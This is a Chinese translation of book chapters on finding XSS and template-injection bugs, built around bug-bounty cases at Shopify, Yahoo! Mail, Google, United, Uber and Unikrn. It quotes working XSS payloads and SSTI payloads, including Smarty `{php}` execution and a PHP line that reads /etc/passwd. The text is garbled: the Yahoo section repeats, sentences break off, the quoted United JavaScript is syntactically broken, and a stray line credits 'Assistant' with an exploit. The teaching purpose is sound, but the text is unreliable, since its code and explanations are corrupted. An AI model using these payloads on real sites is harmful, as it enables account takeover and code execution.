当网站渲染某些未经过过滤的字符时，就会发生 XSS，导致浏览器执行恶意的 JavaScript。允许 XSS 漏洞发生的字符包括双引号（`"`）、单引号（`'`）和角括号（`<`）。

如果网站对字符进行了适当的过滤，这些字符将渲染为 HTML 实体。例如，网页的源代码将把这些字符显示为：

- 双引号（`"`）显示为 `&quot;` 或 `&#34;`
- 单引号（`'`）显示为 `&apos;` 或 `&#39;`
- 左角括号（`<`）显示为 `&lt;` 或 `&#60;`
- 右角括号（`>`）显示为 `&gt;` 或 `&#62;`

这些特殊字符在未经过过滤时，在 HTML 和 JavaScript 中定义了网页的结构。例如，如果一个网站没有对角括号进行过滤，你可以插入 `<script></script>` 来注入负载，如下：

```javascript
<script>alert(document.domain)</script>
```

当你将此负载提交到一个渲染未过滤字符的网站时，`<script></script>` 标签会指示浏览器执行它们之间的 JavaScript。该负载将执行 `alert` 函数，创建一个弹出对话框并显示传递 `alert` 的信息。括号中对 `document` 的引用是 DOM，它返回网站的域名。例如，如果负载在 `https://www.example.com/foo/bar/` 上执行，弹出对话框将显示 `www.example.com`。

## 确认 XSS 影响

当你发现 XSS 漏洞后，请确认其影响，因为并不是所有的 XSS 漏洞都是相同的。确认漏洞的影响并包含此类分析可以完善你的报告，帮助分拣人员验证你的漏洞，并可能增加你的奖金。

例如，在一个未对敏感 cookie 使用 `httponly` 标记的网站上存在 XSS 漏洞，与使用了该标记的 XSS 漏洞是不同的。当网站没有 `httponly` 标记时，你的 XSS 可以读取 cookie 值；如果这些值包含用于识别会话的 cookie，你就可以窃取目标的会话并访问其账户。你可以通过 `document.cookie` 来确认是否可以读取敏感 cookie（知道网站认为哪些 cookie 是敏感的需要对每个网站进行尝试）。即使你无法访问敏感 cookie，你也可以通过 `document.domain` 确认你是否可以从 DOM 访问敏感的用户信息并代表目标执行操作。

但如果你没有弹出正确的域名，该 XSS 对该网站来说可能不是一个漏洞。例如，如果你从沙箱 `iFrame` 中弹出 `document.domain`，你的 JavaScript 可能是无害的，因为它无法访问 cookie、无法在用户账户上执行操作或无法从 DOM 访问敏感的用户信息。

JavaScript 被认为是无害的，是因为浏览器实现了“同源策略”（SOP）作为一种安全机制。SOP 限制了文档（DOM 中的 D）与从另一个源加载的资源交互的方式。SOP 保护无辜网站免受恶意网站通过用户进行攻击。例如，如果你访问了 `www.<malicious>.com`，它在你的浏览器中向 `www.<example>.com/profile` 发起 GET 请求，SOP 将阻止 `www.<malicious>.com` 读取 `www.<example>.com/profile` 的响应。`www.<example>.com` 网站可能允许不同源的网站与其交互，但这些交互仅限于 `www.<example>.com` 信任的特定网站。

### 同源策略 (SOP) 示例

网站的协议（例如

表 7-1：SOP 示例

| URL | 同源？ | 理由 |
|---|---|---|
| http://www.<example>.com/countries | Yes | N/A |
| http://www.<example>.com/countries/Canada | Yes | N/A |
| https://www.<example>.com/countries | No | 协议不同 |
| http://store.<example>.com/countries | No | 主机不同 |
| http://www.<example>.com:8080/countries | No | 端口不同 |

在某些情况下，URL 不与源匹配。例如，`about:blank` 和 `javascript:` 方案会继承打开它们的文档的源。`about:blank` 上下文访问信息或与浏览器交互，而 `javascript:` 则执行 JavaScript。URL 不提供关于其源的信息，因此浏览器以不同的方式处理这两种上下文。当你发现 XSS 漏洞时，在你的概念证明中使用 `alert(document.domain)` 可以确认 XSS 执行的源，特别是当浏览器中显示的 URL 与 XSS 执行的源不同时。这正是网站打开 `javascript:`URL 时发生的情况。如果 `www.<example>.com` 打开了 `javascript:`URL。

## XSS 攻击类型

在多个位置输入的有效负载（payload）。该有效负载在提交后可能不会立即执行，但在访问另一个页面时可能会执行。例如，如果你在网站上创建一个个人资料，并将 XSS 有效负载作为你的名字，当你查看个人资料时 XSS 可能不会执行；相反，它可能会在别人搜索你的名字或向你发送消息时执行。

你可以将 XSS 攻击分为以下三个子类：基于 DOM 的（DOM-based）、盲目的（blind）和自我的（self）。

### 基于 DOM 的 XSS

基于 DOM 的 XSS 攻击涉及操纵网站现有的 JavaScript 代码来执行恶意 JavaScript；例如，假设页面 www.<example>.com/hi 使用了以下 HTML 将页面内容替换为来自 URL 的值，而没有检查恶意输入。在这种情况下，就可能执行 XSS。

```html
<html>
<body>
<h1>Hi <span id="name"></span></h1>
<script>document.getElementById('name').innerHTML=location.hash.split('#')[1];</script>
</body>
</html>
```

在这个示例页面中，脚本调用 document 对象的 `getElementById` 方法来查找 ID 为 'name' 的 HTML 元素。该调用返回了 `<h1>` 标签中 `<span>` 元素的引用。接下来，脚本标签使用 `innerHTML` 方法修改 `<span id="name"></span>` 之间的文本。脚本将 `<span></span>` 之间的文本设置为来自 `location.hash` 的值，即 URL 中 `#` 之后出现的任何文本（`location` 是另一个浏览器 API，类似于 DOM；它提供了对当前 URL 信息的访问权限）。

因此，访问 www.<example>.com/hi#Peter/ 将导致页面的 HTML 动态更新为 `<<h1><span id="name">Peter</span></h1>`。但该页面在更新 `<span>` 元素之前，没有对 URL 中的 `#` 值进行过滤。如果用户访问了 www.<example>.com/hi#img src=x onerror=alert(document.domain)，将会弹出一个 JavaScript 警框并显示 www.<example}.com（假设浏览器没有返回名为 `x` 的图片）。该页面最终生成的 HTML 看起来像这样：

```html
<html>
<body>
<h1>Hi <span name="name"><img src=x onerror=alert(document.domain)></span></h1>
<script>document.getElementById('name').innerHTML=location.hash.split('#')[1];</script>
</body>
</</html>>
```

这一次，网页并没有在 `<h1>` 标签之间渲染 Peter，而是显示了一个带有 `document.domain` 的 JavaScript 警框。攻击者可以利用这一点，因为为了执行任何 JavaScript，他们只需将 `<img>` 标签的 JavaScript 属性提供给 `onerror` 事件即可。

### 盲目 XSS

盲目 XSS（Blind XSS）是一种存储型 XSS 攻击，其中另一个用户从黑客无法访问的位置渲染 XSS 有效负载。例如，如果你在网站上创建个人资料时，将 XSS 作为你的姓和名，就可能会发生这种情况。但当管理员访问列出所有新用户的管理页面时，由于这些值可能没有经过过滤，XSS 就会执行。由 Matthew Bryant 开发的工具 XSSHunter (`https://xshunter.com/`) 是检测盲目 XSS 的理想工具，脚本会读取 DOM、cookie 以及有效负载返回的其他信息。

### 自我 XSS

自我 XSS（Self XSS）漏洞是指那些仅影响用户自身的漏洞。因为攻击者可以攻击自己，所以自我 XSS 被认为是低风险，且在大多数漏洞赏金计划中无法获得奖励。例如，当 XSS 通过 POST 请求提交时就会发生这种情况。但由于请求受到 CSRF 的保护，只有目标本人可以提交 XSS 有效负载。在这种类型的攻击中，目标会被登出账户并登录到攻击者的账户以执行恶意 JavaScript。一个很好的例子是 Jack Whitton 在 Uber 上发现的，你可以在 `https://whitton.io/articles/turning-self-xss-into-good` 找到它。

自我 XSS 的影响取决于多种因素：它是存储型的还是反射型的、cookie 是否可访问、有效负载在何处执行等。尽管 XSS 可能会对网站造成潜在性损害，但修复 XSS 漏洞通常是简单的，只需要开发者在渲染之前对用户输入进行过滤（就像处理 HTML 注入一样）即可。

## Shopify XSS 漏洞案例

XSS 有效负载并不一定复杂，但你确实需要根据它们渲染的位置以及它们将被包含在 HTML 还是 JavaScript 标签中来进行定制。2015 年 12 月，Shopify 网站是一个简单的网页，顶部有一个明显的搜索框。该页面上的 XSS 漏洞非常简单但容易被忽略：输入到搜索框中的文本以未经过过滤的形式反射在现有的 JavaScript 标签中。人们忽略了这个错误，因为 XSS 有效负载并没有利用未经过过滤的 HTML。当 XSS 利用了 HTML 的渲染方式时，攻击者可以看到有效负载的效果，因为 HTML 定义了网站的外观和感受。

在这种情况下，输入 `<script>alert('XSS')</script>` 不会执行 XSS `alert('XSS')`，因为 Shopify 对 HTML 标签 `<>` 进行了编码。这些字符会被无害地渲染为 `&lt;` 和 `&gt;`。黑客意识到输入是在网页的 `<script>` 标签内以未经过过滤的形式渲染的。黑客很可能是通过查看源代码得出这一结论的，源码包含了该页面的 HTML 和 JavaScript。对于任何网页，在浏览器地址栏中输入 `view-source:URL` 即可查看。例如，图 7-2 显示了 https://shopify.com/ 站点的页面源代码。

在意识到输入未经过过滤就渲染后，黑客在 Shopify 的搜索框中输入了 `test;alert('XSS');`，创建一个带有文本 'xss' 的 JavaScript 警框。

XSS 负载并不总是立即执行的。由于这个原因，黑客应该确保负载在所有可能被渲染的地方都经过了适当的清理。在这个示例中，Shopify 的商店设置允许用户更改货币格式。2015 年 12 月，在设置社交媒体页面时，这些输入框中的值没有经过适当清理。恶意用户可以设置商店，并在商店的货币设置字段中注入 XSS 负载，如图 7-3 所示。该负载会在商店的媒体销售渠道中渲染。恶意用户可以配置商店，以便当另一个商店管理员访问销售渠道时执行该负载。

Shopify 使用 Liquid 模板引擎在商店页面上动态渲染内容。例如，`{{}}` 是 Liquid 的语法；要渲染的变量输入在内层括号中。在图 7-3 中，`{{amount}}` 是一个合法值，但后面附加了值 `"><img src=onerror=alert(document.domain)>`，这就是 XSS 负载。`"` 关闭了负载正在被注入的 HTML 标签。当 HTML 标签被关闭时，浏览器会渲染图像并寻找 `src` 属性中指定的图像源。由于 Shopify 网站上可能不存在具有此值的图像，浏览器会遇到错误并调用 JavaScript 事件处理器 `onerror`。该事件处理器会执行处理程序中定义的 JavaScript。在这种情况下，它是函数 `alert(document.domain)`。

![](img/0e0c482eb94dba4b95528b396562dd10_144_0.png)

图 7-3：报告发布时 Shopify 的货币设置页面

虽然当用户访问货币页面时 JavaScript 不会执行 JavaScript，但该负载也出现在了 Shopify 商店的社交媒体销售渠道中。当其他商店管理员点击漏洞销售渠道标签页时，恶意的 XSS 将以未清理的形式被渲染并执行 JavaScript。

## 总结

XSS 负载在提交后并不总是立即执行的。由于负载可能被用于网站上的多个位置，请务必访问每个位置。在这种情况下，仅仅在货币页面上提交恶意负载并没有触发 XSS。漏洞报告人员必须配置另一个网站功能才能导致 XSS 的执行。

# YAHOO! MAIL 存储型 XSS

- 难度：中等
- URL：Yahoo! Mail



# Yahoo! Mail XSS 漏洞分析

- **来源**：https://klikki.fi/adv/yahoo.html
- **报告日期**：2015 年 12 月 26 日
- **赏金**：$10,000

通过修改输入的文本来清理用户输入，如果操作不当，有时会导致问题。在这个示例中，Yahoo! Mail 的编辑器允许人们通过 `<img>` 标签使用 HTML 在电子邮件中嵌入图像。编辑器通过移除任何如 `onload`、`onerror` 等 JavaScript 属性来清理数据，以避免 XSS 漏洞。然而，它未能避免当用户故意提交畸形的 `<img>` 标签时发生的漏洞。

大多数 HTML 标签都接受属性，属性是关于 HTML 标签的额外信息。例如，`<img>` 标签需要一个 `src` 属性指向图像地址以进行渲染。该标签还允许使用 `width` 和 `height` 属性来定义图像的大小。

某些 HTML 属性是布尔属性：当它们包含在 HTML 标签中时，被视为 true；当它们被省略时，被视为 false。

利用此漏洞，Jouko Pynonen 发现如果他在 HTML 标签中添加带有值的布尔属性，Yahoo! Mail 会移除该值但保留属性的等号。以下是 Pynonen 的示例之一：

```
<INPUT TYPE="checkbox" CHECKED="hello" NAME="check box">
```

在这里，HTML 输入标签可能包含一个 `CHECKED` 属性，表示复选框是否应该被渲染为勾选状态。根据 Yahoo 的标签解析，该行将变成：

```
<INPUT TYPE="checkbox" CHECKED= NAME="check box">
```

这看起来可能无害，但 HTML 允许在未引号的属性值周围存在零或多个空格字符。因此，浏览器将其读取为 `CHECKED` 的值为 `NAME="check"`，且输入标签具有一个名为 `box` 的第三个属性，该属性没有值。

为了利用这一点，Pynonen 提交了以下 `<img>` 标签：

```html
<img ismap='xxx' itemtype='yyy' style=width:100%;height:100%;position:fixed;left:0px;top:0px;onmouseover=alert(XSS/)/>
```

Yahoo! Mail 的过滤会将此更改为如下内容：

`ismap` 值是一个布尔 `<img>` 标签属性，表示图像具有可点击区域。在这种情况下，Yahoo! 删除了 'xxx'，字符串末尾的单引号被移动到了 yyy 的结尾。

有时，网站的后端将是一个黑盒，你不知道代码是如何处理的，就像在这种情况下，我们不知道为什么 'xxx' 被删除了，或者为什么单引号被移动到了 yyy 的末尾。Yahoo! 的解析引擎或浏览器处理 Yahoo! 返回内容的方式可能导致了这些变化。尽管如此，你可以利用这些异常发现漏洞。

由于代码处理的方式，一个高度和宽度为 100% 的 `<img>` 标签被渲染，使图像占据了整个浏览器窗口。当用户将鼠标移动到网页上时，JavaScript 就会执行。

## 总结

通过修改输入的文本来清理用户输入，如果操作不当，有时会导致问题。在这个示例中，Yahoo! Mail 的编辑器允许人们通过 `<img>` 标签使用 HTML 在电子邮件中嵌入图像。编辑器通过移除任何如 `onload`、`onerror` 等 JavaScript 属性来清理数据，以避免 XSS 漏洞。然而，它未能避免当用户故意提交畸形的 `<img>` 标签时发生的漏洞。

大多数 HTML 标签都接受属性，属性是关于 HTML 标签的额外信息。例如，`<img>` 标签需要一个 `src` 属性指向图像地址以进行渲染。该标签还允许使用 `width` 和 `height` 属性来定义图像的大小。

某些 HTML 属性是布尔属性：当它们包含在 HTML 标签中时，被视为 true；当它们被省略时，被视为 false。

利用此漏洞，Jouko Pynonen 发现如果他在 HTML 标签中添加带有值的布尔属性，Yahoo! Mail 会移除该值但保留属性的等号。以下是 Pynonen 的示例之一：

```
<INPUT TYPE="checkbox" CHECKED="hello" NAME="check box">
```

在这里，HTML 输入标签可能包含一个 `CHECKED` 属性，表示复选框是否应该被渲染为勾选状态。根据 Yahoo 的标签解析，该行将变成：

```
<INPUT TYPE="checkbox" CHECKED= NAME="check box">
```

这看起来可能无害，但 HTML 允许在未引号的属性值周围存在零或多个空格字符。因此，浏览器将其读取为 `CHECKED` 的值为 `NAME="check"`，且输入标签具有一个名为 `box` 的第三个属性，该属性没有值。

为了利用这一点，Pynonen 提交了以下 `<img>` 标签：

```html
<img ismap='xxx' itemtype='yyy' style=width:100%;height:100%;position:fixed;left:0px;top:0px;onmouseover=alert(XSS/)/>
```

Yahoo! Mail 的过滤会将此更改为如下内容：

`ismap` 值是一个布尔 `<img>` 标签属性，表示图像具有可点击区域。在这种情况下，Yahoo! 删除了 'xxx'，字符串末尾的单引号被移动到了 yyy 的结尾。

此外，即使是在 Google 等其他大型网站上也要寻找漏洞。人们很容易认为仅仅因为一家公司规模巨大，它的漏洞就会被发现。显然，事实并非总是如此。

# Google 标签管理器存储型 XSS

- **难度**：中等
- **URL**：[tagmanager.google.com/](https://tagmanager.google.com/)
- **来源**：[https://blog.security-guard.com/bugbounty-the-5000-google-xss/](https://blog.security-guard.com/bugbounty-the-5000-google-xss/)
- **报告日期**：2014年10月31日
- **赏金**：$5,000

网站的一个常见最佳实践是在渲染时对用户输入进行过滤，而不是在提交时进行过滤。原因是这样做很容易引入新的向网站提交数据的方法（例如文件上传），并忘记对输入进行过滤。然而，在某些情况下，公司并没有遵循这一惯例：HackerOne 的 Patrik Fehrenbach 在 2014 年 10 月测试 Google 的 XSS 时发现了这一疏漏。

Google 标签管理器（Google Tag Manager）是一种 SEO 工具，让营销人员能够轻松更新网站标签。为了实现这一点，该工具提供了许多用户交互的 Web 表单。Fehrenbach 开始寻找可用的表单字段并输入 XSS 负载，例如 `"><img src=/ onerror=alert(3)>`。如果负载被表单字段接受，负载将关闭现有的 HTML 标签，然后尝试加载不存在的图像。由于找不到该图像，网站将执行 onerror JavaScript 函数 `alert(3)`。

但 Fehrenbach 的负载没有起作用。Google 对他的输入进行了适当的过滤。Fehrenbach 注意到另一种提交负载的方法。除了表单字段外，Google 还提供了上传包含多个标签的 JSON 文件的功能。因此，Fehrenbach 向 Google 服务上传了以下 JSON 文件：

```json
"data": {
  "name": "#<img src=/onerror=alert(3)>",
  "type": "AUTO_EVENTVarMacro",
  "varType": "HISTORY_NEW_URL_FRAGMENT"
}
```

注意，`name` 属性的值与 Fehrenbach 之前尝试的 XSS 负载相同。Google 并没有遵循最佳实践，而是在提交时对 Web 表单的输入进行过滤，而不是在渲染时。结果，Google 忘记了过滤文件上传的输入，因此 Fehrenbach 的负载执行了。

## 启示

在 Fehrenbach 的报告中，有两个细节值得注意。首先，Fehrenbach 为他的 XSS 负载找到了替代输入方法。你也应该寻找替代输入方法。务必测试目标提供的所有输入输入方法，因为每种输入的处理方式可能不同。其次，Google 试图在输入时进行过滤，而不是在渲染时。Google 本本可以通过遵循最佳实践来防止这种漏洞。即使你知道网站开发者通常会针对某些攻击采取防御措施，也要检查漏洞。开发者也会犯错。

# 联合航空 XSS

- **难度**：困难
- **URL**：checkin.united.com/
- **来源**：http://strukt93.blogspot.jp/2016/07/united-to-xss-united.html
- **报告日期**：2016年7月
- **赏金**：未公开

在 2016 年 7 月，Mustafa Hasan 在寻找廉价时开始在联合航空网站上寻找漏洞。他发现访问子域名 `checkin.united.com` 会重定向到一个包含 `sid` 参数的 URL。注意到传递给参数的任何值都会渲染在页面 HTML 中，他测试了 `<svg onload=confirm(1)>>`。如果渲染不当，该标签将关闭现有的 HTML 标签并注入 Hasan 的 `<svg>` 标签，导致由于 `onload` 事件触发 JavaScript 弹出窗口。

但当他提交 HTTP 请求时，什么都没有发生，尽管他的负载被原样渲染了且未经过过滤。Hasan 并没有放弃，而是打开了网站的 JavaScript 文件（很可能是使用浏览器的开发工具）。

他发现了以下代码，这些代码覆盖了可能导致 XSS 的 JavaScript 属性，例如 `alert`、`confirm`、`prompt` 和 `write` 属性：

```javascript
[function () {
/*
通过 JavaScript 防止 XSS
*/
 var XSSObject = new Object();
XSSObject.lockdown = function(obj,name) {
  if (String.prototype.startsWith) {
    try {
      if (Object.defineProperty) {
        Object.defineProperty(obj, name,
        configurable: false
      }
    } catch (e) { }
  }
}
nXSSObject.proxy = function (obj, name, report_function, exec_original) {
  var proxy = obj[name];
  obj[name] = function () {
    if (exec_original) {
      return proxy.apply(this, arguments);
    }
  };
XSSObject.lockdown(obj, name);
nXSSObject.proxy(window, 'alert', 'window.alert', false);
XSSObject.proxy(window, 'confirm', 'window.confirm', false);
XSSObject.proxy(window, 'prompt', 'window.prompt', false);
nXSSObject.proxy(window, 'escape', 'escape', false);
XSSObject.proxy(document, 'write', 'document.write', false);
}
```

iFrame 可以通过 `source` 属性来引入远程 HTML。因此，Assistant 可以将 `source` 设置为 JavaScript，从而立即调用带有文档域名的 `alert` 函数。

## 核心要点

注意关于此漏洞的三个重要细节。首先，Hasan 很有毅力。当他的负载没有被触发时，他并没有放弃，而是深入研究 JavaScript 以寻找原因。其次，使用 JavaScript 属性黑名单应该让黑客意识到代码中可能存在 XSS 漏洞，因为这些都是开发者出现疏忽的机会。第三，JavaScript 知识对于成功确认更复杂的漏洞至关重要。

## 总结

XSS 漏洞对网站开发者构成了真实风险，并且在网站上仍然普遍，随处可见。通过提交恶意负载，例如 `<img src=x onerror=alert(document.domain)>`，你可以检查输入字段是否存在漏洞。但这并不是测试 XSS 漏洞的唯一方法。每当网站通过修改（删除字符、属性等）对输入进行过滤时，你都应该彻底测试该过滤功能。寻找网站在提交时而非渲染时对输入过滤的机会，并测试所有输入方法。此外，寻找你控制的 URL 参数是否反映在页面上；这些可能允许你发现可以绕过编码的 XSS 攻击，例如在锚点标签的 `href` 值中添加 `javascript:alert(document.domain)`。

考虑网站渲染你输入的所有地方以及它是在 HTML 中还是 JavaScript 中是非常重要的。记住，XSS 负载可能不会立即执行。

# 8 模板注入

模板引擎是一种通过在渲染模板时自动填充模板中的占位符，来创建动态网站、电子邮件和其他媒体的代码。通过使用占位符，模板引擎允许开发者将应用程序与业务逻辑分离。例如，网站可能为用户资料页仅使用一个模板，并为资料字段设置动态占位符，如用户名、电子邮件地址和年龄。模板引擎通常还提供额外优势，例如用户输入过滤功能、简化的 HTML 生成和易于维护。但这些功能并不能让模板引擎免受漏洞影响。

当引擎在渲染输入时没有进行适当过滤，就会发生模板注入漏洞，有时会导致远程代码执行。我们将在第十二章中详细介绍远程代码执行。

模板注入漏洞有两种类型：服务端和客户端。

## 服务端模板注入

服务端模板注入 (SSTI) 漏洞发生在服务端逻辑中注入时。由于模板引擎与特定的编程语言相关，当发生注入时，你有时能够执行该语言的任意代码。你是否能这样做取决于引擎提供的安全保护以及网站的预防措施。Python 的 `Jinja2` 引擎允许文件访问和远程执行，就像 Rails 默认使用的 Ruby `ERB` 模板引擎一样。相比之下，Shopify 的 `Liquid` 引擎允许访问有限的 Ruby 方法，试图防止完全远程代码执行。其他流行的引擎包括 PHP 的 `Smarty` 和 `Twig`、Ruby 的 `Haml`、`Mustache` 等。

要测试 SSTI 漏洞，你需要使用所用引擎的特定语法提交模板表达式。例如，PHP 的 `Smarty` 模板引擎使用双大括号 `{{` 来表示表达式，而 `ERB` 使用角括号、百分比符号和等号的组合 `<%=>`。`Smarty` 的典型注入测试涉及提交 `{{7*7}}` 并寻找输入反映在页面上的区域（如表单、URL 参数等）。在这种情况下，你将寻找代码 `7*7` 在表达式中执行后生成的 `49`。如果你发现了 `49`，说明你成功注入了表达式且模板对其进行了求值。

由于语法在所有模板引擎中并不统一，你必须知道构建测试测试网站的软件。`Wappalyzer` 和 `BuiltWith` 等工具专门为此目的设计。识别软件后，使用该模板引擎的语法提交简单的负载，例如 `7*7`。

## 客户端模板注入

客户端模板注入 (CSTI) 漏洞发生在客户端模板引擎中并用 JavaScript 编写。流行的客户端模板引擎包括 Google 的 `AngularJS` 和 Facebook 的 `ReactJS`。

由于 CSTI 发生在用户的浏览器中，你通常无法利用它们来实现远程代码执行，但你可以利用它们进行 XSS。然而，实现 XSS 有时是困难的，并且需要绕过预防措施，就像 SSTI 漏洞一样。例如，`ReactJS` 使用 `dangerouslySetInnerHTML` 来防止 XSS，但如果你能控制输入，就可以绕过它。

利用此 CSTI 实现 XSS，可能导致开发者账户及相关应用程序被攻破。

## 核心要点

在确认网站是否使用客户端模板引擎后，开始通过提交与该引擎语法相同的有效负载（例如针对 `AngularJS`）来对网站进行测试，并观察渲染结果。如果有效负载被执行，请在浏览器控制台中输入 `Angular.version` 以检查网站正在使用的 `AngularJS` 版本。如果版本大于 1.6，你可以从上述资源中提交有效负载而无需绕过沙箱（Sandbox bypass）。如果版本小于 1.6，则你需要提交针对应用程序所使用的 `AngularJS` 版本的沙箱绕过方案（例如 Kettle 方法）。

# UBER FLASK JINJA2 模板注入

- **难度**：中
- **URL**：https://riders.uber.com/
- **来源**：https://hackerone.com/reports/125980/
- **报告日期**：2016年3月25日
- **赏金**：$10,000



# 在进行黑客攻击时，识别公司使用的技术至关重要

当 Uber 在 HackerOne 上启动其公共漏洞赏金计划时，还在其网站 `https://eng.uber.com/bug-bounty/` 上包含了一份“宝藏地图”（修订后的地图于 2017 年 8 月在 `https://medium.com/uber-security/bug-bounty-treasure-map-1719af85c/` 发布）。该地图识别了 Uber 公开的若干敏感属性，其中 `riders.uber.com` 是用 `Node.js`、`Express` 和 `Backbone.js` 构建的，这些技术中没有一个一眼看上去像是潜在的 SSTI 攻击点。但 `vault.uber.com` 网站使用的是 `Flask` 和 `Jinja2` 开发的，`Jinja2` 是一种服务端模板引擎，如果实现不当，可能允许远程代码执行。尽管 `riders.uber.com` 没有使用 `Jinja2`，但如果网站向 `vault` 或这些站点提供输入，且这些站点在未进行过滤的情况下信任了该输入，攻击者可能利用 SSTI。发现此漏洞的黑客 Tsai 将 `{{7}}` 作为他的姓名开始漏洞测试。他搜索了子域名之间是否存在交互。在报告中，Orange 解释说，对 `riders.uber.com` 上个人资料的任何更改都会向账户所有者发送电子邮件以通知更改——这是一种常见的安全机制。通过将网站上的姓名更改为包含 `{{7}}`，他收到了一封姓名包含数字七的邮件，如图 8-1 所示。

**图 8-1：Orange 收到的执行其注入到名称中的代码的邮件。** 这种行为立即引起了他的警觉，因为 Uber 评估了他的表达式并将其替换为结果。Orange 然后尝试提交 Python 代码 `{% for c in range(3) %}{{c}}{% end %}` 来确认更复杂的操作是否可以被评估。这段代码会打印每个数字三次。图 8-2 中的邮件显示 Orange 的姓名显示为 for 循环产生的数字，这证实了他的发现。`Jinja2` 同时也实现了一个沙箱，限制了执行任意代码的能力，但偶尔可以被绕过。在这种情况下，Orange 是可以做到这一点的。

Orange 只提交了报告，但他本可以更进一步地利用该漏洞。在报告中，他感谢了 HackerOne 的博客文章提供了发现漏洞所需的必要信息。但这些文章还包含了关于 `Jinja2` 漏洞与其他概念结合时扩展范围的额外信息。让我们稍作绕路，看看这些额外信息是如何起作用的。

**图 8-2：Orange 注入更复杂代码后产生的邮件。** 通过查看 HackerOne 的博客文章 `https://hackerone.com/blog/2016/03/09/exploring-sst-in-flask-jinja2.html`，可以发现此漏洞适用于 Orange 的漏洞。

在博客文章中，Orange 详细介绍了如何通过内省（introspection，一种面向对象的编程概念）来利用 `Jinja2`。内省涉及在运行时检查对象的属性，以查看其可用的数据。面向对象的内省的工作原理超出了本书的范围。在该漏洞的背景下，内省允许 Orange 执行代码并识别在注入发生时模板对象拥有哪些属性。一旦攻击者知道了这些信息，就可以找到可能被利用的属性以实现远程代码执行；我将在第 12 章中介绍这一漏洞。

当 Orange 发现此漏洞时，他仅仅报告了执行内省所需代码的能力，而不是尝试进一步利用该漏洞。采取 Orange 的方法是最好的，因为这可以确保你没有执行任何意外的操作；同时，公司可以评估该漏洞的潜在影响。如果你有兴趣探索问题的完整严重性，请在报告中询问公司是否可以继续测试。

## 核心要点

注意网站使用的技术；通常，这些技术会提供关于如何利用该网站的见解。务必同时考虑技术之间的相互作用。在这种情况下，`Flask` 和 `Jinja2` 是极好的攻击向量，尽管它们没有直接用于受漏洞站点。就像 XSS 漏洞一样，检查输入可能被使用的所有地方，因为漏洞可能并非显而易见。在这种情况下，恶意负载在用户的个人资料页上以明文形式渲染，并在发送邮件时执行了代码。

# RAILS 动态渲染

**难度：** 中

**URL：** N/A

**来源：** `https://nvisium.com/blog/2016/01/26/rails-dynamic-render-to-rce-cve-2016-0752/`

**报告日期：** 2015年2月1日

**赏金：** N/A

2016 年初，Ruby on Rails 团队披露了在处理模板渲染时的一个潜在远程代码执行漏洞。nVisium 团队的一位成员发现了该漏洞，并对该问题（编号为 `CVE-2016-0752`）提供了极具价值的报告。Ruby on Rails 使用模型-视图-控制器（MVC）架构。在这种设计中，数据库逻辑（模型）与表示逻辑（视图）以及应用程序逻辑（控制器）分离。

在报告中，nVisium 团队解释了负责应用程序的 Rails 控制器如何根据用户控制的参数推断要渲染的模板文件。取决于网站的开发方式，这些用户控制的参数可能会被直接传递给渲染函数。

如果使用的是 Linux 机器且该文件是可读的，Rails 就会打印你的 `/etc/passwd` 文件。

根据 nVisium 的文章，Rails 使用的搜索序列在用户提交模板注入时（例如 `<%25%3dls%25>`），也可以用于任意代码执行。如果该网站使用默认的 Rails 模板语言 ERB，此编码后的输入将被解释为 `<%= ls %>`，即列出当前目录下所有文件的 Linux 命令。虽然 Rails 团队已经修复了此漏洞，但你仍然可以对 SSTI 进行测试，以防开发者将用户控制的输入传递给内联渲染：因为 `inline:` 被用于直接向 `render` 函数提供 ERB。

## 启示

理解你正在测试的软件是如何工作的将帮助你发现漏洞。在这种情况下，如果任何 Rails 网站将用户控制的输入传递给 `render` 函数，那么它就存在漏洞。理解 Rails 使用的设计模式无疑有助于发现这一漏洞。就像此示例中的模板参数一样，要留意当你控制可能与内容渲染方式直接相关的输入时，可能出现的机会。

# UNIKRN SMART 模板注入

- **难度：** 中等
- **URL：** 不适用
- **来源：** `https://hackerone.com/reports/164224/`
- **报告日期：** 2016年8月29日
- **赏金：** $400

2016年8月29日，我受邀参加了当时针对 Unikrn 的私有漏洞赏金计划，Unikrn 是一个电竞博彩网站。在最初的网站侦察期间，我使用的 Wappalyzer 工具确认了该网站正在使用 `AngularJS`。这一发现为我敲响了警钟，因为我曾成功发现过 `AngularJS` 注入漏洞。我开始尝试通过提交 `{{7*7}}` 并寻找渲染出的数字 49 来寻找 CSTI 漏洞，从我的个人资料页开始。尽管在个人资料页没有成功，但我注意到可以邀请朋友加入网站，所以我也测试了该功能。

在向自己发送了邀请后，我收到了图 8-3 所示的奇异邮件。

![](img/0e0c482eb94dba4b95528b396562dd10_173_0.png)

**图 8-3：我从 Unikrn 收到的带有 Smarty 错误的邮件**

邮件开头包含一个带有 Smarty 错误的堆栈跟踪，显示 `7*7` 未被识别。看起来 `{{7*7}}` 被注入到了模板中，Smarty 试图评估该代码但无法识别 `7*7`。

我立即咨询了 James Kettle 关于模板注入的不可或缺的文章（`http://blog.portswigger.net/2015/08/server-side-template-injection.html`）以测试引用的 Smarty 负载（他还在 YouTube 上提供了一场非常棒的 Black Hat 演讲）。Kettle 特别提到了负载 `{self::getStreamVariable("file://proc/self/loginnuid")}`，该负载调用 `getStreamVariable` 方法来读取 `/proc/self/loginnuid` 文件。我尝试了他分享的负载但没有得到输出。

现在我对自己的发现表示怀疑。但随后我搜索了 Smarty 文档中的保留变量，其中包含了 `{$smarty.version}` 变量，它可以返回正在使用的 Smarty 版本。我将我的个人资料名称改为 `{$smarty.version}` 并向网站重新注册。结果是收到了一封以 2.6.18 作为我名字的邀请邮件，这正是该网站安装的 Smarty 版本。我的注入正在被执行，我的信心恢复了。

当我继续阅读文档时，我了解到可以使用标签 `{php} ... {/php}` 来执行任意 PHP 代码（Kettle 在他的文章中特别提到了这些标签，但我完全漏掉了它们）。因此，我尝试将 `{php}print "Hello"{/php}` 作为我的名称并再次提交邀请。结果的邮件显示 Hello 邀请我加入网站，这证实我已执行了 PHP 的 `print` 函数。

作为最后的测试，我想提取 `/etc/passwd` 文件，以向漏洞赏金计划证明此漏洞的潜力。尽管 `/etc/passwd` 文件不是关键的，但访问它通常被用作证明远程代码执行的标志。因此我使用了以下负载：

```php
<?php}$s=file_get_contents('/etc/passwd');var_dump($s);</php>
```

这段 PHP 代码打开 `/etc/passwd` 文件，使用 `file_get_contents` 读取其内容，并将内容赋值给变量 `$s`。一旦设置了 `$s`，我就使用 `var_dump` 转储该变量的内容，期望我收到的邮件将包含 `/etc/passwd` 的内容作为邀请我加入 Unikrn 的名字。但奇怪的是，我收到的邮件名字是空的。

